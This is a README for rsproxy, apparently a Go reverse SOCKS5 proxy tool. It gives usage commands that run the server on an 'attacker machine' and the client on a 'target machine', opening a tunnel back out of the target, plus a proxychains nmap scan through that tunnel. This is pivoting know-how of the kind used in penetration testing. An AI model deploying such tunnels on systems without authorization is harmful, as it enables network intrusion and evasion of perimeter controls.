# rsproxy

Reverse SOCKS5 proxy. Single binary for client and server.

## Features

- Reverse SOCKS5 proxy (RFC 1928)
- TLS encrypted tunnel (auto-generated self-signed cert or custom)
- Plain TCP mode (`-no-tls`)
- Password authentication
- Yamux multiplexing (multiple connections over single tunnel)
- Auto-reconnect with configurable delay
- IPv4, IPv6 and domain support
- Protocol mismatch detection (TLS/plain TCP)

## Usage

### Server (attacker machine)

```bash
# With TLS (default - auto-generates certificate)
rsproxy -mode server -pass <password> -agent 0.0.0.0:443 -socks 127.0.0.1:1080 -v

# With custom certificate
rsproxy -mode server -pass <password> -cert server.pem -key server-key.pem

# Without TLS
rsproxy -mode server -pass <password> -agent 0.0.0.0:443 -no-tls -v
```

### Client (target machine)

```bash
# With TLS
rsproxy -mode client -connect SERVER:443 -pass <password> -insecure -v

# Without TLS
rsproxy -mode client -connect SERVER:443 -pass <password> -no-tls -v
```

### Proxy usage

Once connected, configure your tools to use the SOCKS5 proxy:

```bash
# curl
curl -x socks5h://127.0.0.1:1080 http://target

# proxychains
proxychains nmap -sT target
```

## Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-mode` | `server` or `client` | |
| `-pass` | Authentication password | |
| `-agent` | [server] Agent listen address | `:8443` |
| `-socks` | [server] SOCKS5 listen address | `127.0.0.1:1080` |
| `-cert` | [server] TLS certificate file | auto-generated |
| `-key` | [server] TLS key file | auto-generated |
| `-connect` | [client] Server address (host:port) | |
| `-insecure` | [client] Skip TLS verification | `false` |
| `-retry` | [client] Reconnect delay (seconds) | `5` |
| `-no-tls` | Disable TLS (both sides) | `false` |
| `-v` | Verbose logging | `false` |

## Build

```bash
# Windows
go build -ldflags "-s -w" -o rsproxy.exe .

# Linux
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o rsproxy_linux_amd64 .
```
